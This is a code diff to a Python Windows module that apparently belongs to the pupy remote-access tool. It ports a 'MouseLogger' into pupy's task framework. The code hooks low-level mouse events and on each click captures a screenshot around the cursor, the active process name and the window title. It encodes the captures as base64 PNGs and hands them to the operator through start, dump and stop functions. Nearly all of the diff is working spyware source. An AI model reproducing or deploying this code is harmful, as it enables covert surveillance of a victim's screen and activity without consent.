@@ -2,12 +2,47 @@
 # Mostly stolen and recreated by golind
 import sys
 from ctypes import *
-from ctypes.wintypes import MSG
-from ctypes.wintypes import DWORD
+from ctypes.wintypes import *
 import threading
 import time
 import datetime
 import base64
+import struct
+from zlib import compress, crc32
+
+import pupy
+
+def _to_png(data, width, height):
+    # From MSS
+    line = width * 3
+    png_filter = struct.pack('>B', 0)
+    scanlines = b''.join(
+        [png_filter + data[y * line:y * line + line] for y in reversed(range(height))]
+    )
+    magic = struct.pack('>8B', 137, 80, 78, 71, 13, 10, 26, 10)
+
+    # Header: size, marker, data, CRC32
+    ihdr = [b'', b'IHDR', b'', b'']
+    ihdr[2] = struct.pack('>2I5B', width, height, 8, 2, 0, 0, 0)
+    ihdr[3] = struct.pack('>I', crc32(b''.join(ihdr[1:3])) & 0xffffffff)
+    ihdr[0] = struct.pack('>I', len(ihdr[2]))
+
+    # Data: size, marker, data, CRC32
+    idat = [b'', b'IDAT', compress(scanlines), b'']
+    idat[3] = struct.pack('>I', crc32(b''.join(idat[1:3])) & 0xffffffff)
+    idat[0] = struct.pack('>I', len(idat[2]))
+
+    # Footer: size, marker, None, CRC32
+    iend = [b'', b'IEND', b'', b'']
+    iend[3] = struct.pack('>I', crc32(iend[1]) & 0xffffffff)
+    iend[0] = struct.pack('>I', len(iend[2]))
+
+    return b''.join([
+        magic,
+        b''.join(ihdr),
+        b''.join(idat),
+        b''.join(iend)
+    ])
 
 from ctypes import (
     byref, memset, pointer, sizeof, windll,
@@ -61,6 +96,42 @@ kernel32 = windll.kernel32
 WH_MOUSE_LL=14
 WM_MOUSEFIRST=0x0200
 
+LRESULT = LPARAM
+ULONG_PTR = WPARAM
+HANDLE  = c_void_p
+HHOOK   = HANDLE
+HKL     = HANDLE
+ULONG_PTR = WPARAM
+HOOKPROC = WINFUNCTYPE(LRESULT, c_int, WPARAM, LPARAM)
+LPMSG = POINTER(MSG)
+
+GetModuleHandleW = kernel32.GetModuleHandleW
+GetModuleHandleW.restype = HMODULE
+GetModuleHandleW.argtypes = [LPCWSTR]
+
+SetWindowsHookEx = user32.SetWindowsHookExW
+SetWindowsHookEx.argtypes = (c_int, HOOKPROC, HINSTANCE, DWORD)
+SetWindowsHookEx.restype = HHOOK
+
+SetTimer            = user32.SetTimer
+SetTimer.restype    = ULONG_PTR
+SetTimer.argtypes   = (HWND, ULONG_PTR, UINT, c_void_p)
+
+KillTimer           = user32.KillTimer
+KillTimer.restype   = BOOL
+KillTimer.argtypes  = (HWND, ULONG_PTR)
+
+GetForegroundWindow = user32.GetForegroundWindow
+
+GetWindowThreadProcessId = user32.GetWindowThreadProcessId
+GetWindowThreadProcessId.restype = DWORD
+GetWindowThreadProcessId.argtypes = (HWND, POINTER(DWORD))
+
+GetMessageW         = user32.GetMessageW
+
+UnhookWindowsHookEx = user32.UnhookWindowsHookEx
+CallNextHookEx      = user32.CallNextHookEx
+
 psapi = windll.psapi
 current_window = None
 
@@ -107,35 +178,45 @@ BitBlt.restypes =  BOOL
 GetDIBits.restypes = INT
 DeleteObject.restypes = BOOL
 
-class MouseLogger(threading.Thread):
+def mouselogger_start():
+    if pupy.manager.active(MouseLogger):
+        return False
+
+    try:
+        mouselogger = pupy.manager.create(MouseLogger)
+    except:
+        return False
+
+    return True
+
+def mouselogger_dump():
+    mouselogger = pupy.manager.get(MouseLogger)
+    if mouselogger:
+        return mouselogger.results
+
+def mouselogger_stop():
+    mouselogger = pupy.manager.get(MouseLogger)
+    if mouselogger:
+        pupy.manager.stop(MouseLogger)
+        return mouselogger.results
+
+class MouseLogger(pupy.Task):
     def __init__(self, *args, **kwargs):
-        threading.Thread.__init__(self, *args, **kwargs)
+        super(MouseLogger, self).__init__()
         self.hooked  = None
-        self.daemon=True
-        self.lUser32=user32
-        self.pointer=None
-        self.stopped=False
-        self.screenshots=[]
+        self.pointer = None
 
-    def run(self):
-        if self.install_hook():
-            #print "mouselogger installed"
-            pass
-        else:
+    def task(self):
+        if not self.install_hook():
             raise RuntimeError("couldn't install mouselogger")
-        msg = MSG()
-        user32.GetMessageA(byref(msg),0,0,0)
-        while not self.stopped:
-            time.sleep(1)
-        self.uninstall_hook()
-            
-    def stop(self):
-        self.stopped=True
 
-    def retrieve_screenshots(self):
-        screenshot_list=self.screenshots
-        self.screenshots=[]
-        return screenshot_list
+        msg = MSG()
+        timer = SetTimer(0, 0, 1000, 0)
+        while self.active:
+            GetMessageW(byref(msg), 0, 0, 0)
+        KillTimer(0, timer)
+
+        self.uninstall_hook()
 
     def get_screenshot(self):
         pos = queryMousePosition()
@@ -177,17 +258,22 @@ class MouseLogger(threading.Thread):
         return pixels.raw, height, width
 
     def install_hook(self):
-        CMPFUNC = WINFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
-        self.pointer = CMPFUNC(self.hook_proc)
-        self.hooked = self.lUser32.SetWindowsHookExA(WH_MOUSE_LL, self.pointer, kernel32.GetModuleHandleW(None), 0)
+        self.pointer = HOOKPROC(self.hook_proc)
+        self.hooked = SetWindowsHookEx(
+            WH_MOUSE_LL,
+            self.pointer,
+            GetModuleHandleW(None),
+            0
+        )
         if not self.hooked:
             return False
         return True
-    
+
     def uninstall_hook(self):
         if self.hooked is None:
             return
-        self.lUser32.UnhookWindowsHookEx(self.hooked)
+
+        UnhookWindowsHookEx(self.hooked)
         self.hooked = None
 
     def hook_proc(self, nCode, wParam, lParam):
@@ -199,36 +285,34 @@ class MouseLogger(threading.Thread):
                 exe, win_title=get_current_process()
             except Exception:
                 pass
-            self.screenshots.append((str(datetime.datetime.now()), height, width, exe, win_title, base64.b64encode(buf)))
-        return user32.CallNextHookEx(self.hooked, nCode, wParam, lParam)
+
+            self.append((
+                str(datetime.datetime.now()), height, width, exe,
+                win_title, base64.b64encode(_to_png(buf, width, height))
+            ))
+
+        return CallNextHookEx(self.hooked, nCode, wParam, lParam)
 
 #credit: Black Hat Python - https://www.nostarch.com/blackhatpython
 def get_current_process():
-    hwnd = user32.GetForegroundWindow()
-    
+    hwnd = GetForegroundWindow()
+
     pid = c_ulong(0)
-    user32.GetWindowThreadProcessId(hwnd, byref(pid))
-    
+    GetWindowThreadProcessId(hwnd, byref(pid))
+
     #process_id = "%d" % pid.value
-    
+
     executable = create_string_buffer("\x00" * 512)
     h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
     psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
-    
+
     window_title = create_string_buffer("\x00" * 512)
     length = user32.GetWindowTextA(hwnd, byref(window_title),512)
-    
+
     kernel32.CloseHandle(hwnd)
     kernel32.CloseHandle(h_process)
     #return "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
     return executable.value, window_title.value
-
-def get_mouselogger():
-    if not hasattr(sys, 'MOUSELOGGER_THREAD'):
-        sys.MOUSELOGGER_THREAD=MouseLogger()
-    return sys.MOUSELOGGER_THREAD
-    
-    
 
 if __name__=="__main__":
     ml = MouseLogger()
